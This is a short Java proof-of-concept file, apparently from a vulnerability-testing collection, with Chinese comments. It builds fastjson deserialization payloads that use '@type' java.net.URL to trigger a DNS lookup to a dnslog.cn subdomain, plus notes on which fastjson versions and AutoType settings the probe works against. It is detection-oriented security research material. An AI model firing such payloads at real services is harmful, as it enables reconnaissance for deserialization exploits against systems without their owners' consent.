package vul.fastjson;

import com.alibaba.fastjson.JSON;

/**
 * @ClassName: urldns
 * @Description: TODO 修改pom.xml中版本号为 1.2.47 并重新导入
 * @Author: Summer
 * @Date: 2020/7/8 13:55
 * @Version: v1.0.0
 * @Description: urldns通常用来作为检验漏洞存在
 **/
public class urldns {
    public static void main(String[] args) {

        // dnslog平台网站：http://www.dnslog.cn/
        // TODO 修改pom.xml fastjson >= 1.2.62
        String payload = "{{\"@type\":\"java.net.URL\",\"val\"" +
                ":\"http://qbq5n2.dnslog.cn\"}:\"summer\"}";
        // fastjson < 1.2.62 需要开启 AtuoType
        // TODO 修改pom.xml  1.2.36 < fastjson < 1.2.62
        // 实测fastjson<1.2.36就无法用urldns检测，但可以执行rce命令原因目前不详
        String payload1 = "{{\"@type\":\"java.net.URL\",\"val\"" +
                ":\"http://qbq5n2.dnslog.cn\"}:\"autoCommit\":true}";
        JSON.parse(payload);


    }

}
